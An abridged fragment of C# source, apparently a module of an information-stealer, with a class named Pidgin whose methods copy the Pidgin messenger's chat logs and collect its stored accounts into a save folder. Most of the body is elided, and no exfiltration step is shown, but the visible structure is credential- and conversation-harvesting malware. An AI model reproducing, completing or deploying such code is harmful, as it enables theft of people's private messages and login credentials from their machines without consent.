    ...
    internal sealed class Pidgin
    {
        ...
        private static void GetLogs(string sSavePath)
        {
            try
            {
                ...
                deepside.Filemanager.CopyDirectory(logs, sSavePath + "\\chatlogs");
            }
            catch (Exception ex) { deepside.Logging.Log("Pidgin >> Failed to collect chat logs\n" + ex); }
        }
        ...
        private static void GetAccounts(string sSavePath)
        {
            ...
            catch (Exception ex) { deepside.Logging.Log("Pidgin >> Failed to collect accounts\n" + ex); }
        }
